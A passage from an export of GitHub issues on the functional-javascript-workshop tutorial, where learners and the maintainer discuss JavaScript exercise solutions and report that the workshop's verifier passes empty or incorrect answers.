  // replace method with spy method
  target[method] = function() {
    result.count++ // track function was called
    return originalFunction.apply(this, arguments) // invoke original function

Thanks a lot in advance. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>lfox91</Owner>
      <Body>Hey Fisker, &#13;
&#13;
You asked this a while ago but hopefully, this helps you or possibly someone else.&#13;
&#13;
This one gave me a lot of trouble as well. I also didn't see how the Spy class could track a function outside of its scope, unless... you augment the function you're spying on to update a property of the Spy class. &#13;
&#13;
`return originalFunction.apply(this, arguments) `&#13;
&#13;
**This** refers to Spy. OriginalFunction is what was just updated when you assigned the new function you created to target[method]. Because you've changed the context of the function with _apply_ the function is now within Spy's context.&#13;
&#13;
Long story short your augmented method now has access to the Spy property count, well more specifically, the result object that holds count. </Body>
    </Comment>
  </Issue_349>
  <Issue_350>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Partial application without Bind - why provide "console" as this?</Title>
    <Owner>timoxley</Owner>
    <Body>Why is the official solution
`console.log.apply(console, [namespace].concat(slice.call(arguments)))`?

This works just as well:
`console.log.apply(null, [namespace].concat(slice.call(arguments)))`

Thank you for the answer.
</Body>
    <State>open</State>
    <Comment>
      <Owner>justsml</Owner>
      <Body>I know this is old, but I just was writing on the subject:&#13;
&#13;
JavaScript's context (`this`) is implicit, meaning:&#13;
&#13;
```js&#13;
// function born w/o context (not required)&#13;
function getCategory() { return `I'm ${this._category}` }&#13;
&#13;
// let's create objects with implied context &#13;
// so calls to `Porsche.getCategory` automatically wire up `this === Porsche`&#13;
var Porsche = {&#13;
  _category: 'fast',&#13;
  getCategory: getCategory &#13;
}&#13;
var Dodge = {&#13;
  _category: 'american',&#13;
  getCategory: getCategory&#13;
}&#13;
// Here are some examples how context works &amp; can be manipulated:&#13;
Porsche.getCategory() // =&gt; I'm fast&#13;
getCategory.call(Porsche) // =&gt; I'm fast&#13;
&#13;
// Override at runtime using `.call(this, ..args)` &#13;
Porsche.getCategory.call(Dodge) // =&gt; I'm american&#13;
&#13;
// "Extract" getCategory from its implicit parent `Porsche` object. &#13;
var getCat = Porsche.getCategory&#13;
//   `getCat` is merely a context-free alias of the `getCategory` method.&#13;
getCat() //=&gt; I'm undefined&#13;
&#13;
// Attach/Save context for later using `Function.bind`&#13;
var imposter = getCat.bind(Dodge)&#13;
imposter() // =&gt; I'm american&#13;
imposter.call(Porsche) // =&gt; I'm american&#13;
// ^^ Re-binding won't work like this&#13;
//   .bind essentially returns a **new function** wrapped with the scope specified.&#13;
&#13;
// Watch out for this pitfall: passing a callback like this will lose the fn's implied context:&#13;
setTimeout(Porsche.getCategory, 10); //=&gt; I'm undefined&#13;
setTimeout(getCategory, 10); //=&gt; I'm undefined&#13;
// ^^ Previous 2 lines show how subtle these bugs can be&#13;
&#13;
// 1st Fix: using `.bind` - returns new func pointer with context locked in&#13;
setTimeout(getCategory.bind(Porsche), 5); // I'm fast&#13;
setTimeout(getCategory.bind(Dodge), 1000); // I'm american&#13;
&#13;
// 2nd Fix: using a closure, call with implied JS context&#13;
setTimeout(() =&gt; Porsche.getCategory(), 5); // I'm fast&#13;
&#13;
// WARNING: Be careful designing with this complexity however, it's rarely necessary. &#13;
// +++ Plus: attackers can send surprises:&#13;
var payload = {_category: 'here for your Porsche', name: '', email: ''}; // from unchecked form&#13;
getCategory.call(payload) // =&gt; I'm here for your Porsche&#13;
&#13;
// Ahh!!&#13;
```&#13;
&#13;
![image](https://cloud.githubusercontent.com/assets/397632/26271386/57374486-3cc2-11e7-8c8e-9c23e215aaf3.png)&#13;
&#13;
&#13;
@peterorosz question's answer needs a bit more info, the `console` is a little different in NodeJS vs Chrome.&#13;
&#13;
In the browser implementation of `console`, its methods are usually pre-bound to `console`. &#13;
&#13;
#### I try not to rely on automatic context binding of `console.log` - as I often only discover moving to synthetic browser or unit tests. Unit tests in particular will need `console.log.bind(console)`.&#13;
&#13;
&#13;
</Body>
    </Comment>
  </Issue_350>
  <Issue_351>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Remove unnecessary arguments</Title>
    <Owner>timoxley</Owner>
    <Body>The function "fn" is a user-supplied function that would not take "index" and "arr" arguments.
</Body>
    <State>open</State>
    <Comment>
      <Owner>aonghusonia</Owner>
      <Body>the callback function supplied to Array.prototype.map() takes three arguments:&#13;
 &#13;
currentValue: The current element being processed in the array.&#13;
index (Optional): The index of the current element being processed in the array.&#13;
array (Optional): The array map was called upon.&#13;
&#13;
the tests pass even if you leave the second two out (see below) but I think the official solution is more complete with them &#13;
```js&#13;
module.exports = function map(arr, fn) {&#13;
  return arr.reduce(function(acc, item, index) {&#13;
    acc[index] = (fn(item))&#13;
    return acc&#13;
  }, [])&#13;
} &#13;
```</Body>
    </Comment>
  </Issue_351>
  <Issue_352>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Exercise two - official solution does not work yet passes!</Title>
    <Owner>timoxley</Owner>
    <Body>Everything seems to pass unless an error is thrown! For example the official solution

``` js
 function repeat(operation, num) {
   if (num &lt;= 0) return
   operation()
   return repeat(operation, --num)
 }

 module.exports = repeat
```

only performs the operation once yet passes the verification

a working alternative would be:

``` js

function repeat(operation, num) {

  if (num &gt; 0){
    operation(); //do the operation
  }
  else {  return;  }

  repeat(operation, --num); //reduce number first then use recursion

};

module.exports = repeat;

```
</Body>
    <State>open</State>
    <Comment>
      <Owner>teone</Owner>
      <Body>This code would also pass the verication:

```
function repeat(operation, num) {
  if(num &gt;= 0){
    return;
  }
  //operation();
  return repeat(operation, num -1);
}

module.exports = repeat;
```

Also if operation is actually never called..
</Body>
    </Comment>
    <Comment>
      <Owner>swinston100</Owner>
      <Body>Good point @teone !!!
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>I don't see the problem with the solution. e.g. this works (try paste in browser console):

``` js
function repeat(operation, num) {
   if (num &lt;= 0) return
   operation()
   return repeat(operation, --num)
 }

// should repeat 5 times
var count = 0;
repeat(function() {
  count++
}, 5);

if (count !== 5) {
  console.error('it does not work')
} else {
  console.log('it works')
}
```

Though yeah, the verification is definitely broken.
</Body>
    </Comment>
  </Issue_352>
  <Issue_353>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Exercise 8: Why slice?</Title>
    <Owner>timoxley</Owner>
    <Body>The solution implementation says:

``` javascript
function duckCount() {
  return Array.prototype.slice.call(arguments).filter(function(obj) {
    return Object.prototype.hasOwnProperty.call(obj, 'quack')
  }).length
}
```

But this is also valid:

``` javascript
function duckCount() {
  return Array.prototype.filter.call(arguments, function(item) {
    return Object.prototype.hasOwnProperty.call(item, 'quack')
  }).length
}
```

So... why using slice.call()? If you are already using .filter, why use another thing too? (which is also irrelevant)
</Body>
    <State>open</State>
    <Comment>
      <Owner>CrossEye</Owner>
      <Body>That's a good idea.

I think there are many people who never consider operating directly on `arguments` without turning it immediately into an array, simply because it's often tricky to do so.  Hence anything that works with `arguments` automatically starts with that `Array.prototype.slice.call` incantation.

But as you demonstrate, it's not necessary.  Your solution is cleaner and more elegant.
</Body>
    </Comment>
    <Comment>
      <Owner>shrynx</Owner>
      <Body>@felixsanz @CrossEye 
Even i found the slice bit weird (though obviously this solution is correct too). I implemented it with reduce.

``` javascript
function duckCount() {
    return Array.prototype.reduce.call(arguments,function(count, curr){
        return count + +(Object.prototype.hasOwnProperty.call(curr,'quack'))
    },0)
}
```
</Body>
    </Comment>
  </Issue_353>
  <Issue_354>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Higher Order Functions hack solution</Title>
    <Owner>timoxley</Owner>
    <Body>This exercise passes with the following code:

```
function repeat(operation, num) {
    operation(num);
}

module.exports = repeat
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>mmwtsn</Owner>
      <Body>Testing against `1.0.5` it appears that _anything_ passes so long as the function is exported correctly.

For example, this passes:

``` javascript
function repeat(fn, num) {
}

module.exports = repeat
```
</Body>
    </Comment>
  </Issue_354>
  <Issue_355>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Check if the strings 'for' and 'while' in function</Title>
    <Owner>timoxley</Owner>
    <Body>Fixes #119 by checking the given function for the strings "while" or "for". It has the obvious drawback of failing if the mere string is present.

Not sure if this is the best solution but I thought at least it would get a dialog started on how to fix this issue.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Ideally we'd parse their solution into an AST and check for loop constructs that way&#8230; but this perhaps solves it the most simple way.
</Body>
    </Comment>
  </Issue_355>
  <Issue_356>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Exercise 8: Basic Call: run/verify throws error, if anything but a number is returned </Title>
    <Owner>timoxley</Owner>
    <Body>When testing my faulty solution, `run` and `verify` throw `Error: [sprintf] expecting number but found undefined "undefined"`. This happens, if your module returns anything, but a number, e.g.:

``` JS
function duckCount() {
  return 
}

module.exports = duckCount
```

Tested  `{}`, `[]`,`''` as well.

I was confused first, because the error is thrown inside the workshop script. I think it would be helpful, if a type check was performed to anticipate an error like this. Maybe this is related to other exercises as well.

The full stack:

``` SH
/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/sprintf/lib/sprintf.js:163
                    throw new Error(sprintf('[sprintf] expecting number but found %s "' + arg + '"', get_type(arg)));
                    ^

Error: [sprintf] expecting number but found undefined "undefined"
    at str_format.format (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/sprintf/lib/sprintf.js:163:12)
    at str_format (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/sprintf/lib/sprintf.js:77:28)
    at Object.vsprintf (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/sprintf/lib/sprintf.js:244:17)
    at Object.defaultTranslation [as translate] (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/i18n-core/index.js:38:15)
    at Object.__ (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/i18n-core/lib/createTranslator.js:34:15)
    at /usr/local/lib/node_modules/functional-javascript-workshop/exercises/basic_call/exercise.js:56:19
    at obtainResult (/usr/local/lib/node_modules/functional-javascript-workshop/exercises/runner.js:100:21)
    at Exercise.&lt;anonymous&gt; (/usr/local/lib/node_modules/functional-javascript-workshop/exercises/runner.js:66:27)
    at next (/usr/local/lib/node_modules/functional-javascript-workshop/node_modules/workshopper-exercise/exercise.js:182:19)
    at /usr/local/lib/node_modules/functional-javascript-workshop/node_modules/workshopper-exercise/exercise.js:189:7
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>jhecking</Owner>
      <Body>I ran into this issue as well in exercise 12 (Function Spies). In the solution, the `spy` object is expected to have a numeric `count` property. I had accidentally named the property `counter` instead in my solution. When verifying my solution I got the same error which was a bit confusing.
</Body>
    </Comment>
  </Issue_356>
  <Issue_357>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Trampoline: I have passed the exercise with a some modifications unintentionally.</Title>
    <Owner>timoxley</Owner>
    <Body>![bildschirmfoto9](https://cloud.githubusercontent.com/assets/7958950/11022036/b83049f2-8654-11e5-8628-53c89e34bbb4.png)
I wanted to first understand only how these function can communicate among themselves. But this check means I have already passed the exercise.
</Body>
    <State>open</State>
    <Comment>
      <Owner>hackerrdave</Owner>
      <Body>this issue should be addressed with this pending PR: https://github.com/timoxley/functional-javascript-workshop/pull/170
</Body>
    </Comment>
  </Issue_357>
  <Issue_358>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Ex 15 Faulty Tester</Title>
    <Owner>timoxley</Owner>
    <Body>In exercise 15, many kinds of incorrect answers are accepted. Most notably, doing nothing:

``` javascript
function loadUsers(userIds, load, done) {
  // DOING NOTHING
}
module.exports = loadUsers
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>deerawan</Owner>
      <Body>I also got same issue. I used the boilerplate and run the verify, it PASSED&#13;
&#13;
```js&#13;
function loadUsers(userIds, load, done) {&#13;
  var users = []&#13;
  for (var i = 0; i &lt; userIds.length; i++) {&#13;
    users.push(load(userIds[i]))&#13;
  }&#13;
  return users&#13;
}&#13;
&#13;
module.exports = loadUsers;&#13;
```</Body>
    </Comment>
  </Issue_358>
  <Issue_359>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Async Loops verify process maybe incorrect.</Title>
    <Owner>timoxley</Owner>
    <Body>``` javascript
//I do nothing with the giving code, but it can pass the verify
function loadUsers(userIds, load, done) {
  var users = []
  for (var i = 0; i &lt; userIds.length; i++) {
    users.push(load(userIds[i]))
  }
  return users
}

module.exports = loadUsers
```

![qq 20150907155802](https://cloud.githubusercontent.com/assets/9394000/9711847/59c1f7d2-5579-11e5-95c1-404e0853629e.png)

The verify process may not correct.
</Body>
    <State>open</State>
    <Comment>
      <Owner>mdorda</Owner>
      <Body>Also empty function will pass the verification.&#13;
&#13;
```javascript&#13;
module.exports = function() {}&#13;
```&#13;
&#13;
I suppose the same bug causes that also makes impossible to run the function using&#13;
`functional-javascript run program.js`.&#13;
&#13;
&#13;
</Body>
    </Comment>
  </Issue_359>
  <Issue_360>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Basic: Call - duckCount function using call() -- a question about objects inheriting from Object.prototype</Title>
    <Owner>timoxley</Owner>
    <Body>In the prompt for this exercise, we're asked a question: But what if an object doesn't inherit from Object.prototype?

```
// create an object with 'null' prototype.
var object = Object.create(null)
object.quack = function() {
  console.log('quack')
}

Object.getPrototypeOf(object) === Object.prototype // =&gt; false
Object.getPrototypeOf(object) === null             // =&gt; true

object.hasOwnProperty('quack')
// =&gt; TypeError: Object object has no method 'hasOwnProperty'
```

OK.  I think I follow: if an object is created with this syntax, 
    var object = Object.create(null)
this object does not inherit from Object.prototype.  Yet, in this problem, there's no need to create objects in said manner, as far as I can tell.  Instead objects are defined as arguments passed into the duckCount function we're instructed to implement by module.exports.  For example, logging the arguments shows that the function is called with the following syntax:

```
duckCount({ quack: true},{ quack: true, hasOwnProperty: [Function] }, { }, { } );
```

So I was wondering whether an object defined as "{quack: true}" inherits all the properties of Object.prototype or not and found that the following function shows that indeed none of the arguments inherit from Object.prototype:

```
function test(){return ({quack: true}.prototype == Object.create.prototype)};
```

So my question is which objects automatically inherit from Object.prototype?  From the top sample code, it seemed as if the presentation suggested that the "null" argument in 
        var object = Object.create(null)
forced it to be an object that does not inherit properties from Object.prototype and that objects, if defined otherwise, generally inherit from Object.prototype.

Clearly, I'm mistaken and I was wondering if knowing which objects inherit from Object.prototype and which don't can be done through reasoning outside of memorizing a breakdown of object types as listed [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain).  

It seems a bit cumbersome to have to memorize that breakdown and I was wondering if this can be further reduced to some single guiding principle on what determines an object's inheriting from Object.prototype or not.  Thank you!
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>&gt; So my question is which objects automatically inherit from Object.prototype?

By default all _objects_ inherit from `Object.prototype`. 
</Body>
    </Comment>
  </Issue_360>
  <Issue_361>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Implement Map with Reduce solution is disingenuous as hell</Title>
    <Owner>timoxley</Owner>
    <Body>If the official solution is going to include a `thisArg` argument to the function you're having me write, _maybe put that in the friggin' description._ Some of us take that description to be a guide for fulfilling the spirit of the exercise and thus learning whatever it is you're allegedly trying to teach. I could have done this exercise with a for loop, but I didn't, because I have the idea that that would defeat the purpose. Crazy, I  know. 

So when you say 'expect an `input` array and an `operation` function', _I expect those things and only those things because I assume my instructor isn't trying to pull a fast one._ What convinced you this was a good idea? Is this some 'think out of the box' shit? If so, I appreciate the vote of confidence, but e e cummings was a brilliant poet _before_ deliberately throwing the rules of English out the window. Know how he got that way? _Straightforward trial-and-error experimentation in order to learn the ins and outs_. This workshopper is presumably aimed at those who aren't all that _good_ at functional programming yet. Try and keep that in mind.

Disclaimer: it's past 2 in the morning and this shit is probably making me madder than it should, but come on, this is like putting a hat on the pavement with a brick under it. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>Ryan1729</Owner>
      <Body>I'm just some guy who happened to be watching this repo, and I don't know if this will help or not, but here's my implementation without a `thisArg` just to show what I think the intended solution was.

``` javascript
module.exports = function arrayMap(arr, fn) {
    'use strict';
    return arr.reduce(function (prev, current) {
        return prev.concat(fn(current));
    }, []);
};
```
</Body>
    </Comment>
    <Comment>
      <Owner>Ryan1729</Owner>
      <Body>Looking at the [commit history for the solution](https://github.com/timoxley/functional-javascript-workshop/commit/f522a355384e499bf98e5685257becbceff52e0c) it looks like the solution was accidentally made more confusing, with the intention of providing a more complete solution.
</Body>
    </Comment>
    <Comment>
      <Owner>C-F-K</Owner>
      <Body>I did already solve it before posting, but yes, yours does make more sense. I also think the exercise could do with a little more explanation of _why_ someone would implement `map`with `reduce` in the first place, since it seems fairly significant but right now I'm mostly taking it on faith that it'll make more sense later, but that's not strictly relevant to my original issue.
</Body>
    </Comment>
    <Comment>
      <Owner>leonmak</Owner>
      <Body>``` javascript
module.exports = function arrayMap(arr, fn) {
  return arr.map(fn);
};
```

The above only uses map, while the previous solution only has reduce. I think since the official answer did not use `map`, the previous answer is the better one. Maybe `reduce` was intended to be called on a user-defined function instead of the arbitrary fn  
</Body>
    </Comment>
    <Comment>
      <Owner>vchouhan</Owner>
      <Body>@ timoxley @leonmak 

After trying for hours I got my solution to work and this is what I came up with.

```
module.exports = function arrayMap(arr, fn) {
    return arr.reduce(function (prev, curr) {
        prev.push(fn.call(null, curr));
        return prev;
    }, []);
};
```

I don't understand why *\* thisArg*\* was passed as a parameter in the solution and what's the purpose of adding that in the solution. Secondly, after I added console.log to check what thisArg was referencing it kept giving me undefined. I understand that as second parameter needs to be passed so the this points to the function context of the calling function. Am I missing anything, Can you please tell me what thisArg is referring too?
</Body>
    </Comment>
    <Comment>
      <Owner>samrose</Owner>
      <Body>In the "Hint" section of the instructions, it reads:&#13;
&#13;
&gt; ## Hints&#13;
&gt; &#13;
&gt;   * No need to implement the optional `thisArg` argument of `Array.prototype.map`, bonus points if you do!&#13;
&#13;
...I think that is where the 'thisArg' comes into play here (it's optional. Maybe they should have given an official solution with, and without)</Body>
    </Comment>
  </Issue_361>
  <Issue_362>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Bug in "Implement Map with Reduce" solution</Title>
    <Owner>timoxley</Owner>
    <Body>The current "official solution" to the "Implement Map with Reduce" excercise does not handle returned array items correctly:

``` js
// Native map implementation
[1, 2, 3].map(function(item) {return [item]})
// -&gt; [[1], [2], [3]]

// "official solution" from tutorial
map([1, 2, 3], function(item) {return [item]})
// -&gt; [1, 2, 3]
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>davidchase</Owner>
      <Body>why not add a exercise to create `flatMap`/`chain` in terms of reduce because thats essentially what the old way did :wink: 
</Body>
    </Comment>
  </Issue_362>
  <Issue_363>
    <Repository>functional-javascript-workshop</Repository>
    <Title>"Higher order functions" always passes</Title>
    <Owner>timoxley</Owner>
    <Body>https://github.com/timoxley/functional-javascript-workshop/blob/master/exercises/higher_order_functions/exercise.js

I tried to fix this but sadly without success. It seems to just pass every solution including:
module.exports = function() {}

I think it might just be comparing return values only (undefined).

All the best and good luck.

Kind regards,
Shanee Vanstone.
</Body>
    <State>open</State>
    <Comment>
      <Owner>vladikoff</Owner>
      <Body>Yeap, this needs to be fixed..</Body>
    </Comment>
  </Issue_363>
  <Issue_364>
    <Repository>functional-javascript-workshop</Repository>
    <Title>It's possible to write a solution to "basic reduce" without using reduce</Title>
    <Owner>timoxley</Owner>
    <Body>For instance, this works :

``` javascript
module.exports = function countWords(words) {
  var count = {};
  words.forEach(function(word) {
    count[word] = (count[word] || 0) + 1;
  });
  return count;
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Anything you can do with reduce you can do with a loop. Point is that the reduce characterises the type of operation you're doing, while a forEach or for loop only tells the reader that you're iterating.

See http://notes-on-haskell.blogspot.sg/2007/02/whats-wrong-with-for-loop.html
</Body>
    </Comment>
    <Comment>
      <Owner>DjebbZ</Owner>
      <Body>Sorry, I didn't make my point clear. I was mentoring at NodeSchool Paris last saturday (International NodeSchool Day \o/), and I realized with another mentor that if you write the solution without reduce, with a for loop for instance, the solution passes the test, whereas it should clearly not pass them since the exercise summary clearly states that we shouldn't use for loop, or other array functions (map, forEach, filter, etc.).
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Oh. Good point!
</Body>
    </Comment>
  </Issue_364>
  <Issue_365>
    <Repository>functional-javascript-workshop</Repository>
    <Title>async loops testing built in solution, not user's.</Title>
    <Owner>timoxley</Owner>
    <Body>A pass is reported whenever the user's file exports a function that does not throw an error, for example:  

``` JavaScript
module.exports = function(){}; 
```

and if I edit the built in solution to this: 

``` JavaScript
function loadUsers(userIds, load, done) {
  var completed = 0
  var users = []
  userIds.forEach(function(id, index) {
    load(id, function(user) {
      users[index] = 42;//user
      if (++completed === userIds.length) return done(users)
    })
  })
}

module.exports = loadUsers
```

then I get a fail message like the following

``` JavaScript
[ 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42 ]
&#10007; expected: 
[ { id: 888, name: 'Elit veniam' },
  { id: 1000, name: 'Labore magna' },
  { id: 154, name: 'Sit commodo' },
  { id: 400, name: 'Magna Lorem' },
  { id: 399, name: 'Aliqua esse' },
  { id: 853, name: 'Non non' },
  { id: 124, name: 'Laboris incididunt' },
  { id: 193, name: 'Ex commodo' },
  { id: 983, name: 'Nostrud duis' },
  { id: 917, name: 'Pariatur cillum' },
  { id: 915, name: 'Cillum ullamco' },
  { id: 666, name: 'Ex velit' },
  { id: 94, name: 'Aliquip reprehenderit' } ]
 but got:
[ 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42 ]

# FAIL

Your solution to Async Loops didn't pass. Try again!
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>lol, whoops, I'll look into it, thanks for reporting
</Body>
    </Comment>
    <Comment>
      <Owner>swinston100</Owner>
      <Body>I think there is still somethign wrong with this test as 

``` js
function loadUsers(userIds, load, done) {

  done = usersIDs.foreach(function(userID){
    return load(userID)
  });
  return done
}

module.exports = **loadUsers**

```

and there is no way this is proper functional coding and it is not taking into account the instructions!
</Body>
    </Comment>
  </Issue_365>
  <Issue_366>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Exercise [7] - A Basic Recursion win #2</Title>
    <Owner>timoxley</Owner>
    <Body>Look at this:

``` javascript
function reduce(arr, fn, initial){
  if (!arr.length) return initial;
  return reduce(arr.slice(1), fn, fn(initial, arr[0]));
}

module.exports = reduce;
```

Is it a correct answer?
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>That looks quite good on the surface, I might have to think about it more.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>ok I think this is pretty kickass, but can you adapt it to also pass the current index to `fn()`? That's not written as a requirement but the official solution does implement the additional index param for good measure.
</Body>
    </Comment>
    <Comment>
      <Owner>mqklin</Owner>
      <Body>Oh, that is written as a requirement: 

&gt; this function must be passed previousValue, currentValue, **index and the array we're iterating over**

I can do this:

```
function reduce(arr, fn, initial){
  if (!arr.length)  return initial;
  var index = 0;
  for (var key in initial)  index += initial[key];
  return reduce(arr.slice(1), fn, fn(initial, arr[0], index /*,???*/));
}

module.exports = reduce;
```

but it is impossible to pass start array, because i slice it on every iteration (sorry for my english)
</Body>
    </Comment>
    <Comment>
      <Owner>mqklin</Owner>
      <Body>No, i can:

```
function reduce(arr, fn, initial){
  if (arr.length === 0)  return initial;
  if (Object.keys(initial).length === 0)  {
    fn.startArray = arr.slice();
    fn.index = -1;
  }
  fn.index++;
  return reduce(arr.slice(1), fn, fn(initial, arr[0], fn.index, fn.startArray));
}

module.exports = reduce;
```

As Dima Bilan said:

&gt; Impossible is possible

But i suspect that this is not functional JS, what do you think?
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>&gt; Object.keys(initial).length

This seems to work on the assumption that the initial value is always an Object, but what if it's not?
</Body>
    </Comment>
    <Comment>
      <Owner>mqklin</Owner>
      <Body>```
function reduce(arr, fn, initial){
  if (arr.length === 0){
    delete fn.init;
    delete fn.startArray;
    delete fn.index;
    return initial;
  }
  if (typeof(fn.init) === 'undefined'){
    fn.init = true;
    fn.startArray = arr.slice();
    fn.index = -1;
  }
  fn.index++;
  return reduce(arr.slice(1), fn, fn(initial, arr[0], fn.index, fn.startArray));
}

module.exports = reduce;
```

From wiki:

&gt; In computer science, functional programming is a programming paradigm&#8212;a style of building the structure and elements of computer programs&#8212;that treats computation as the evaluation of mathematical functions and **avoids changing-state and mutable data**.

I think, my solution is not very _functional_.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Perhaps you can store the state in a closure rather than on the function itself?
</Body>
    </Comment>
    <Comment>
      <Owner>mqklin</Owner>
      <Body>Like this?

```
function reduce(arr, fn, initial){
  return (function(){
    var idx = 0;
    var startArray = arr.slice();
    return (function helper(arr, fn, initial){
      if (arr.length === 0) return initial;
      return helper(arr.slice(1), fn, fn(initial, arr[0], idx++, startArray));
    })(arr, fn, initial);
  })();
}

module.exports = reduce;
```
</Body>
    </Comment>
    <Comment>
      <Owner>iliyan-trifonov</Owner>
      <Body>I also solved it by making reduce a recursive one:

``` javascript
function reduce (arr, fn, initial) {
  if (!arr.length) return initial;
  var head = arr[0];
  var tail = arr.slice(1);
  var result = fn(initial, head, 0, tail);
  return reduce(tail, fn, result);
}
```

But this way I forced the index to be always 0 so I failed :)

No problem, the suggested solution was brilliant. I just want to add one more thing there: to avoid the side effect of using the arr variable from reduce() inside reduceOne() we should add a maxIndex = arr.length - 1 and arr2 = arr variables to reduceOne() and pass them through the recursion like this:

``` javascript
function reduce (arr, fn, initial) {
  return (function reduceOne (index, maxIndex, arr2, value) {
    if (index &gt; maxIndex) return value;
    return reduceOne(index + 1, maxIndex, arr2, fn(value, arr2[index], index, arr2));
  })(0, arr.length - 1, arr, initial);
}
```

But this is just as an exercise and it looks more than ugly that way :)

Anyway please add another fn() to use the index variable so solutions that don't move the index properly will be caught.

Thanks!
</Body>
    </Comment>
  </Issue_366>
  <Issue_367>
    <Repository>functional-javascript-workshop</Repository>
    <Title>A Basic Recursion win</Title>
    <Owner>timoxley</Owner>
    <Body>A rather strange passing answer to Basic Recursion.

```
function reduce(arr, fn, initial) { 
    if(!arr.length) return initial; //exit
    reduce(arr.slice(0, arr.length-1), fn, initial); 
    return fn(initial, arr[arr.length-1], arr.length-1, arr);
}

module.exports = reduce;
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Hm, so it stores all the `fn` calls on the stack then runs them. neat. I have a feeling I need more tests around this though.
</Body>
    </Comment>
    <Comment>
      <Owner>zhukovka</Owner>
      <Body>I have one strange either )

``` javascript
function reduce(arr, fn, initial) {
    // SOLUTION GOES HERE
    var index = reduce.index | 0;
    if (index == arr.length) {
        delete reduce.index;
        return initial;
    }

    initial = fn(initial, arr[index], index, arr);
    reduce.index = index + 1;
    return reduce(arr, fn, initial);
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>techyrajeev</Owner>
      <Body>even this---

``` javascript
 function reduce(arr,fn,initial){
    if(!arr.length) return initial;
    return reduce(arr.slice(1),fn,fn(initial,arr[0],0,arr));
}
module.exports=reduce;
```
</Body>
    </Comment>
    <Comment>
      <Owner>nanu-c</Owner>
      <Body>this also

``` javascript
function reduce(arr, fn, initial) {
    if(!arr.length) return initial;
    return reduce(arr.slice(1),fn,fn(initial,arr[0]));
}
```
</Body>
    </Comment>
  </Issue_367>
  <Issue_368>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Trampolining operation()</Title>
    <Owner>timoxley</Owner>
    <Body>In the given solution, the first time that 

```
function repeat(operation, num) {
}
```

is called, no operation() is performed, since the actual operation() call is returned in the continuation being passed back.  This seems puzzling.

Wouldn't it make more sense to perform an operation() for each call to repeat(), and just pass back the next step in the continuation?  (i.e. move the operation() call up two lines?)

If, OTOH, I fail at understanding how this should be done, please be gentle :-) 
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Good point, though it doesn't really matter that much, there are multiple possible solutions:

As you suggested:

``` js
function repeat(operation, num) {
  if (num &lt;= 0) return
  operation()
  return function() {
    return repeat(operation, --num)
  }
}
```

I think I prefer this though:

``` js
function repeat(operation, num) {
  return function() {
    if (num &lt;= 0) return
    operation()
    return repeat(operation, --num)
  }
}
```

and the current solution looks like:

``` js
function repeat(operation, num) {
  if (num &lt;= 0) return
  return function() {
    operation()
    return repeat(operation, --num)
  }
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>AndyHoang</Owner>
      <Body>Could you please explain the repeat function?
As the exercise before it (https://github.com/timoxley/functional-javascript-workshop/tree/master/problems/blocking_event_loop)
As for as I know, repeat seem like to call an action several times. So in this ex, we return a function, and inside of this function, we call operation() one time, then try to call a repeat num-1 times again.
So how exactly operation was called?
Normally I try to write some test case for testing, but I dont know how to write for this one, as a result I don't understand at all :(
The blocking event loop ex, I barely understand it. Maybe it's the reason I couldn't get this one. Could you point me some more tut or exercise about this blocking event loop? (I read this one https://github.com/timoxley/functional-javascript-workshop/issues/62)
I lost here :(
</Body>
    </Comment>
    <Comment>
      <Owner>robinpokorny</Owner>
      <Body>I do not like the `return repeat(operation, --num)` line. To be precise I do not like the `return` keyword. It is not needed and it is not present in current official solution. Shouldn't it be removed?
</Body>
    </Comment>
    <Comment>
      <Owner>nsubordin81</Owner>
      <Body>I'm was confused about this one. I wasn't able to figure out the trampoline solution without looking up some context about why we use it in javascript. The way I understand it now, one of the main reasons is to make up for lack of tail-call optimization in javascript. For this problem, that would mean even though repeat's last call is the recursive one, the interpreter will still spin up a new stack frame for each recursive invocation. &#13;
&#13;
